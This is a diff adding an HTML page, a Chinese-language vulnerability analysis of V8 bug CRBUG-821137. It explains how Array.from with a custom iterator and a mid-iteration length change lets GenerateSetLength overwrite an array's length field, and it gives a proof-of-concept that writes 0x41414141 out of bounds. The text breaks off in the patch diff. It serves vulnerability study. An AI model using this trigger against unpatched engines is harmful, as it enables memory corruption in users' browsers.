@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>V8漏洞分析之CRBUG-821137</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="v8-crbug-821137">V8漏洞分析之CRBUG-821137</h1>
+<p>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</p>
+<p>作为V8漏洞分析系列第一篇文章，会写的很详细</p>
+<p>源码下载编译什么的可以参考之前的文章，这里不再啰嗦了</p>
+<p>搞V8也有段时间了，网上的资料说多不多，说少也不少，很多很基础的东西我都是尽量自己去搜，我觉得搞V8的一个很关键的点在于如何把Poc在V8里的<strong>执行过程</strong>对应上</p>
+<p>今天我们拿一个品相不错的洞来分析</p>
+<ul>
+<li><a href="https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d%5E%21/">https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d%5E%21/</a></li></ul>
+<p>拿到parent的hash</p>
+<p><img src="resources/40C2FF1E7B4E6325CBB12C69AC01B976.jpg" alt=""></p>
+<p>我们下载好源码之后，切换到漏洞commit</p>
+<pre><code>v8 git:(master) ✗ git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599
+Checking out files: 100% (5182/5182), done.
+HEAD is now at 1dab065bb4 [errors] Give a more informative error message for `new Map(1)`
+</code></pre><p>然后用工具打开分析源码，不要在意为什么我定位在这里</p>
+<p><img src="resources/AB2B5509D484EC92B117BD84D0580EA8.jpg" alt="IMAGE"></p>
+<p>在V8里，会有一些常用函数会被<code>builtin</code>，路径在<code>v8/src/builtins/</code>下，我们以上图里的函数为例，这段代码所在文件为<code>v8/src/builtins/builtins-array-gen.cc</code>，这是一种DSL，全名为：<code>Domain-Specific Language</code>，领域特定语言</p>
+<pre><code>// ES #sec-array.from
+TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) {
+    TNode&lt;Context&gt; context = CAST(Parameter(BuiltinDescriptor::kContext));
+    TNode&lt;Int32T&gt; argc = UncheckedCast&lt;Int32T&gt;(Parameter(BuiltinDescriptor::kArgumentsCount));
+
+    CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));
+
+    // 获取map_function
+    TNode&lt;Object&gt; map_function = args.GetOptionalArgumentValue(1);
+
+    // If map_function is not undefined, then ensure it&#39;s callable else throw.
+    {
+        // 创建label分支用于跳转
+        Label no_error(this), error(this);
+        // 如果未定义则跳到no_error分支
+        GotoIf(IsUndefined(map_function), &amp;no_error);
+        // 如果是Smi类型则跳到error分支，这里涉及到了对象的存储，后面会写，简单来说指针类型最后一位是1
+        GotoIf(TaggedIsSmi(map_function), &amp;error);
+        // 分支，map_function可调用跳到no_error，不可调用跳到error
+        Branch(IsCallable(map_function), &amp;no_error, &amp;error);
+
+        // error分支
+        BIND(&amp;error);
+        // 抛出异常
+        ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);
+
+        // no_error分支
+        BIND(&amp;no_error);
+    }
+
+    // 创建是否可迭代分支
+    Label iterable(this), not_iterable(this), finished(this), if_exception(this);
+
+    TNode&lt;Object&gt; this_arg = args.GetOptionalArgumentValue(2);
+    TNode&lt;Object&gt; items = args.GetOptionalArgumentValue(0);
+    // The spec doesn&#39;t require ToObject to be called directly on the iterable
+    // branch, but it&#39;s part of GetMethod that is in the spec.
+    TNode&lt;JSReceiver&gt; array_like = ToObject(context, items);
+
+    TVARIABLE(Object, array);
+    TVARIABLE(Number, length);
+</code></pre><p>这段代码为一种叫作<code>CodeStubAssembler</code>的DSL，V8官方博客有对这种语言的使用介绍</p>
+<ul>
+<li><a href="https://v8.dev/blog/csa">https://v8.dev/blog/csa</a></li></ul>
+<p>我们可以读一下这段代码，其实挺简单的，注释我都写好了</p>
+<p>在理解了<code>CodeStubAssembler</code>大概的语法之后</p>
+<p>我们可以开始讲今天的漏洞</p>
+<p>首先来看Poc，先创建了一个数组，然后对这个数组做<code>Array.from()</code>调用，里面重新定义了迭代函数</p>
+<pre><code>let oobArray = [];
+Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ =&gt; (
+    {
+        counter : 0,
+        max : 1024 * 1024 * 8,
+        next() {
+            let result = this.counter++;
+            if (this.counter == this.max) {
+                oobArray.length = 0;
+                return {done: true};
+            } else {
+                return {value: result, done: false};
+            }
+        }
+    }
+) });
+oobArray[oobArray.length - 1] = 0x41414141;
+</code></pre><p>我们来看这个函数的定义</p>
+<ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/from">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/from</a></li></ul>
+<p><img src="resources/9A0BF36012310FF93E5791C3AB5B2A10.jpg" alt="IMAGE"></p>
+<p>也就是说，当我们传进去一个数组，它会再创建一个新的数组返回，并不会影响原来的数组</p>
+<p>来看代码，可以看到不会修改传入的数组</p>
+<pre><code>let array = [1, 2, 3];
+let result = Array.from(array, x =&gt; x + x);
+console.log(array);
+console.log(result);
+
+&gt; Array [1, 2, 3]
+&gt; Array [2, 4, 6]
+</code></pre><p>但是按照Poc里的写法，就可以对原有数组做修改，成功改掉了传入的数组</p>
+<pre><code>let array = [1, 2, 3];
+Array.from.call(function() { return array }, {[Symbol.iterator] : _ =&gt; (
+    {
+        counter : 0,
+        max : 10,
+        next() {
+            let result = this.counter++;
+            if (this.counter == this.max) {
+                return {done: true};
+            } else {
+                return {value: result, done: false};
+            }
+        }
+    }
+) });
+console.log(array);
+
+&gt; Array [0, 1, 2, 3, 4, 5, 6, 7, 8]
+</code></pre><p>换句话来说，我们CSA代码里，改的也是传入的数组本身，感慨JS还是要深入学习，不然这种特性我是肯定想不到的</p>
+<p>这也解释了为什么我们传入的第一个参数是<code>function() { return array }</code>这样的写法而不是直接传入一个数组变量</p>
+<p>第二个参数涉及到了迭代的问题，大概的语法可以看出来，主要是实现<code>next()</code>函数，这里的逻辑是循环<code>max</code>次，把<code>counter++</code>作为返回值，注意看两个<code>return</code>，<code>done</code>为<code>true</code>表示迭代完成，这里由<code>this.counter == this.max</code>判断，注意我们现在是在重写迭代函数，所以可以随意写迭代逻辑和迭代次数</p>
+<pre><code>{[Symbol.iterator] : _ =&gt; (
+    {
+        counter : 0,
+        max : 10,
+        next() {
+            let result = this.counter++;
+            if (this.counter == this.max) {
+                return {done: true};
+            } else {
+                return {value: result, done: false};
+            }
+        }
+    }
+) }
+</code></pre><p>再来看Poc，我们先创建了一个数组<code>oobArray</code>，之后的写法我们上面解释过，迭代次数为<code>1024 * 1024 * 8</code>，唯一不同的是我们在迭代结束后，改掉了数组的长度</p>
+<pre><code>let oobArray = [];
+Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ =&gt; (
+    {
+        counter : 0,
+        max : 1024 * 1024 * 8,
+        next() {
+            let result = this.counter++;
+            if (this.counter == this.max) {
+                oobArray.length = 0;
+                return {done: true};
+            } else {
+                return {value: result, done: false};
+            }
+        }
+    }
+) });
+oobArray[oobArray.length - 1] = 0x41414141;
+</code></pre><p>我们来思考下，在迭代里把数组的长度改为0或者说进行修改，会发生什么</p>
+<p>这需要开始看源码</p>
+<p>对应的源码就是我们刚刚看的那一段，JS里一部分数组操作写进了<code>builtins</code>，可以通过命名观察到，或者函数开头命名也行</p>
+<p>这里贴出了整个函数的代码，前面一部分我们已经分析过</p>
+<pre><code>// ES #sec-array.from
+TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) {
+  TNode&lt;Context&gt; context = CAST(Parameter(BuiltinDescriptor::kContext));
+  TNode&lt;Int32T&gt; argc =
+      UncheckedCast&lt;Int32T&gt;(Parameter(BuiltinDescriptor::kArgumentsCount));
+
+  CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));
+
+  TNode&lt;Object&gt; map_function = args.GetOptionalArgumentValue(1);
+
+  // If map_function is not undefined, then ensure it&#39;s callable else throw.
+  {
+    Label no_error(this), error(this);
+    GotoIf(IsUndefined(map_function), &amp;no_error);
+    GotoIf(TaggedIsSmi(map_function), &amp;error);
+    Branch(IsCallable(map_function), &amp;no_error, &amp;error);
+
+    BIND(&amp;error);
+    ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);
+
+    // 跳到这里
+    BIND(&amp;no_error);
+  }
+
+  // 创建是否可迭代分支
+  Label iterable(this), not_iterable(this), finished(this), if_exception(this);
+
+  TNode&lt;Object&gt; this_arg = args.GetOptionalArgumentValue(2);
+  TNode&lt;Object&gt; items = args.GetOptionalArgumentValue(0);
+  // The spec doesn&#39;t require ToObject to be called directly on the iterable
+  // branch, but it&#39;s part of GetMethod that is in the spec.
+  TNode&lt;JSReceiver&gt; array_like = ToObject(context, items);
+
+  TVARIABLE(Object, array);
+  TVARIABLE(Number, length);
+
+  // Determine whether items[Symbol.iterator] is defined:
+  IteratorBuiltinsAssembler iterator_assembler(state());
+  Node* iterator_method =
+      iterator_assembler.GetIteratorMethod(context, array_like);
+  Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable);
+
+  // 可迭代，或者说有迭代函数
+  BIND(&amp;iterable);
+  {
+    TVARIABLE(Number, index, SmiConstant(0));
+    TVARIABLE(Object, var_exception);
+    Label loop(this, &amp;index), loop_done(this),
+        on_exception(this, Label::kDeferred),
+        index_overflow(this, Label::kDeferred);
+
+    // Check that the method is callable.
+    {
+      Label get_method_not_callable(this, Label::kDeferred), next(this);
+      GotoIf(TaggedIsSmi(iterator_method), &amp;get_method_not_callable);
+      GotoIfNot(IsCallable(iterator_method), &amp;get_method_not_callable);
+      Goto(&amp;next);
+
+      BIND(&amp;get_method_not_callable);
+      ThrowTypeError(context, MessageTemplate::kCalledNonCallable,
+                     iterator_method);
+
+      BIND(&amp;next);
+    }
+
+    // 创建输出数组，也就是一开始我们看到的result数组，用于保存迭代结果，此时为空
+    // 由于我们的骚操作，此时就是传入的数组本身
+    // Construct the output array with empty length.
+    array = ConstructArrayLike(context, args.GetReceiver());
+
+    // Actually get the iterator and throw if the iterator method does not yield
+    // one.
+    IteratorRecord iterator_record =
+        iterator_assembler.GetIterator(context, items, iterator_method);
+
+    TNode&lt;Context&gt; native_context = LoadNativeContext(context);
+    TNode&lt;Object&gt; fast_iterator_result_map =
+        LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);
+
+    Goto(&amp;loop);
+
+    // 开始迭代
+    BIND(&amp;loop);
+    {
+      // Loop while iterator is not done.
+      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(
+          context, iterator_record, &amp;loop_done, fast_iterator_result_map));
+      TVARIABLE(Object, value,
+                CAST(iterator_assembler.IteratorValue(
+                    context, next, fast_iterator_result_map)));
+
+      // If a map_function is supplied then call it (using this_arg as
+      // receiver), on the value returned from the iterator. Exceptions are
+      // caught so the iterator can be closed.
+      {
+        Label next(this);
+        GotoIf(IsUndefined(map_function), &amp;next);
+
+        CSA_ASSERT(this, IsCallable(map_function));
+        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,
+                         this_arg, value.value(), index.value());
+        GotoIfException(v, &amp;on_exception, &amp;var_exception);
+        value = CAST(v);
+        Goto(&amp;next);
+        BIND(&amp;next);
+      }
+
+      // Store the result in the output object (catching any exceptions so the
+      // iterator can be closed).
+      Node* define_status =
+          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),
+                      index.value(), value.value());
+      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);
+
+      index = NumberInc(index.value());
+
+      // The spec requires that we throw an exception if index reaches 2^53-1,
+      // but an empty loop would take &gt;100 days to do this many iterations. To
+      // actually run for that long would require an iterator that never set
+      // done to true and a target array which somehow never ran out of memory,
+      // e.g. a proxy that discarded the values. Ignoring this case just means
+      // we would repeatedly call CreateDataProperty with index = 2^53.
+      CSA_ASSERT_BRANCH(this, [&amp;](Label* ok, Label* not_ok) {
+        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),
+                                           NumberConstant(kMaxSafeInteger), ok,
+                                           not_ok);
+      });
+      Goto(&amp;loop);
+    }
+
+    // 迭代结束
+    BIND(&amp;loop_done);
+    {
+      length = index; // index为迭代次数，也就是输出数组的length
+      Goto(&amp;finished); // 跳转到finished分支
+    }
+
+    BIND(&amp;on_exception);
+    {
+      // Close the iterator, rethrowing either the passed exception or
+      // exceptions thrown during the close.
+      iterator_assembler.IteratorCloseOnException(context, iterator_record,
+                                                  &amp;var_exception);
+    }
+  }
+
+  // 不可迭代或者没有迭代函数分支
+  // Since there&#39;s no iterator, items cannot be a Fast JS Array.
+  BIND(&amp;not_iterable);
+  {
+    ......
+  }
+
+  // 迭代结束跳到这里
+  BIND(&amp;finished);
+
+  // 设置输出数组的长度
+  // Finally set the length on the output and return it.
+  GenerateSetLength(context, array.value(), length.value());
+  args.PopAndReturn(array.value());
+}
+</code></pre><p>对于代码里构造输出数组时我说就是传入的数组本身这个问题，我们可以验证一下，我们创建一个简单的数组，里面就一个元素，第一次迭代，进入else分支，此时还没有返回，所以输出的是原始数组，第二次迭代，此时第一次迭代的数据已经写进去，所以第一位被改掉为0，之后同理</p>
+<pre><code>let array = [1];
+Array.from.call(function() { return array }, {[Symbol.iterator] : _ =&gt; (
+    {
+        counter : 0,
+        max : 10,
+        next() {
+            let result = this.counter++;
+            if (this.counter == this.max) {
+                return {done: true};
+            } else {
+                console.log(array);
+                return {value: result, done: false};
+            }
+        }
+    }
+) });
+console.log(array);
+
+&gt; Array [1]
+&gt; Array [0]
+&gt; Array [0, 1]
+&gt; Array [0, 1, 2]
+&gt; Array [0, 1, 2, 3]
+&gt; Array [0, 1, 2, 3, 4]
+&gt; Array [0, 1, 2, 3, 4, 5]
+&gt; Array [0, 1, 2, 3, 4, 5, 6]
+&gt; Array [0, 1, 2, 3, 4, 5, 6, 7]
+&gt; Array [0, 1, 2, 3, 4, 5, 6, 7, 8]
+</code></pre><p>所以如果我们传入的是<code>[1, 2, 3]</code>，就会输出如下的数据</p>
+<pre><code>&gt; Array [1, 2, 3]
+&gt; Array [0, 2, 3]
+&gt; Array [0, 1, 3]
+&gt; Array [0, 1, 2]
+&gt; Array [0, 1, 2, 3]
+&gt; Array [0, 1, 2, 3, 4]
+&gt; Array [0, 1, 2, 3, 4, 5]
+&gt; Array [0, 1, 2, 3, 4, 5, 6]
+&gt; Array [0, 1, 2, 3, 4, 5, 6, 7]
+&gt; Array [0, 1, 2, 3, 4, 5, 6, 7, 8]
+</code></pre><p>再回到源码，我们看到最后有一个函数<code>GenerateSetLength()</code>用于设置输出函数的长度</p>
+<pre><code>// 迭代结束跳到这里
+BIND(&amp;finished);
+
+// 设置输出数组的长度
+// Finally set the length on the output and return it.
+GenerateSetLength(context, array.value(), length.value());
+args.PopAndReturn(array.value());
+</code></pre><p>确定该函数三个参数：</p>
+<ul>
+<li>第一个参数是运行环境上下文<code>context</code></li><li>第二个参数是已经被修改的原始数组</li><li>第三个参数是迭代次数，以我们目前的Poc为标准就是<code>1024 * 1024 * 8</code></li></ul>
+<p>跟入该函数，进入<code>fast</code>那个分支</p>
+<pre><code>void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array,
+                         TNode&lt;Number&gt; length) {
+    Label fast(this), runtime(this), done(this);
+    // Only set the length in this stub if
+    // 1) the array has fast elements,
+    // 2) the length is writable,
+    // 3) the new length is greater than or equal to the old length.
+
+    // 1) Check that the array has fast elements.
+    // TODO(delphick): Consider changing this since it does an an unnecessary
+    // check for SMIs.
+    // TODO(delphick): Also we could hoist this to after the array construction
+    // and copy the args into array in the same way as the Array constructor.
+    BranchIfFastJSArray(array, context, &amp;fast, &amp;runtime);
+
+    BIND(&amp;fast);
+    {
+      // 进入这里，获取数组为fast_array
+      // [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+      TNode&lt;JSArray&gt; fast_array = CAST(array);
+
+      // 迭代的次数，注意，是迭代的次数：1024 * 1024 * 8
+      TNode&lt;Smi&gt; length_smi = CAST(length);
+      // 这里获取的是该数组自己的长度，结合Poc来看，这里已经被改为0了
+      // 有一点需要注意，因为我们是在JS代码里将数组长度改为0，这是正规操作
+      // 也就是说，我们在迭代结束的时候，修改了数组长度，由引擎来做的操作，数组是会缩小的
+      // 假如原来有100个长度，我们迭代结束后，改为10个，那么这个数组就只剩10个长度
+      // 第11个开始就是其它对象的数据
+      // 所以old_length的值取决于我们最后设置的值
+      TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);
+      CSA_ASSERT(this, TaggedIsPositiveSmi(old_length));
+
+      // 2) Ensure that the length is writable.
+      // TODO(delphick): This check may be redundant due to the
+      // BranchIfFastJSArray above.
+      EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);
+
+      // 3) If the created array already has a length greater than required,
+      //    then use the runtime to set the property as that will insert holes
+      //    into the excess elements and/or shrink the backing store.
+      // 如果length_smi小于old_length就跳去runtime分支执行动态修改数组长度操作
+      // 也就是迭代的次数小于传入数组的长度，假如我传入一个100长度的数组，但是只迭代了5个
+      // 但是我生成的数组长度还是100，所以需要优化长度
+      // 作者的想法：如果等于就直接把迭代次数写入，也就是说迭代次数等于数组长度
+      // 可是作者没有想到，如果迭代完，传入数组长度被修改
+      // 估计作者更没有想到传入的会是初始数组本身
+      // 如同我们这里的数据，迭代次数length_smi为1024 * 1024 * 8，但是old_length迭代完被改为0或者很小的数据
+      // 这就造成了内存里，一个长度为很小的数据的数组的长度字段被直接覆写为很大的值（取决于迭代次数）
+      // 此时拥有了一个非常好用的越界读写
+      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);
+
+      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
+                                     length_smi);
+
+      Goto(&amp;done);
+    }
+
+    BIND(&amp;runtime);
+    {
+      CallRuntime(Runtime::kSetProperty, context, static_cast&lt;Node*&gt;(array),
+                  CodeStubAssembler::LengthStringConstant(), length,
+                  SmiConstant(LanguageMode::kStrict));
+      Goto(&amp;done);
+    }
+
+    BIND(&amp;done);
+}
+</code></pre><p>我们来看补丁，如果迭代次数和数组长度不等，就跳到<code>runtime</code>分支</p>
+<pre><code>-      // 3) If the created array already has a length greater than required,
++      // 3) If the created array&#39;s length does not match the required length,
+       //    then use the runtime to set the property as that will insert holes
+-      //    into the excess elements and/or shrink the backing store.
